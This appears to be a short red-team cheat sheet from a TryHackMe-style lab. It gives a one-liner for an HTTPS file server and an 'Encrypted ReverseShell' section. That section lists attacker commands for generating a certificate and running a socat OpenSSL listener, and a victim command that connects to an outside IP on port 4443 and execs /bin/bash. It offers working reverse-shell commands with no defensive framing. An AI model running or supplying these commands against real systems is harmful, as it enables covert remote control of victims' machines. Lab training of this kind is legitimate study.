## Encrypted webserver

	openssl req -new -x509 -keyout localhost.pem -out localhost.pem -days 365 -nodes

	python3 -c "import http.server, ssl;server_address=('[IP]',443);httpd=http.server.HTTPServer(server_address,http.server.SimpleHTTPRequestHandler);httpd.socket=ssl.wrap_socket(httpd.socket,server_side=True,certfile='localhost.pem',ssl_version=ssl.PROTOCOL_TLSv1_2);httpd.serve_forever()"

## Encrypted ReverseShell

```
(Attacker)
openssl req -x509 -newkey rsa:4096 -days 365 -subj '/CN=www.redteam.thm/O=Red Team HM/C=UK' -nodes -keyout thm-reverse.key -out thm-reverse.crt

cat thm-reverse.key thm-reverse.crt > thm-reverse.pem

socat -d -d OPENSSL-LISTEN:4443,cert=thm-reverse.pem,verify=0,fork STDOUT

(Victim)
socat OPENSSL:10.20.30.1:4443,verify=0 EXEC:/bin/bash

```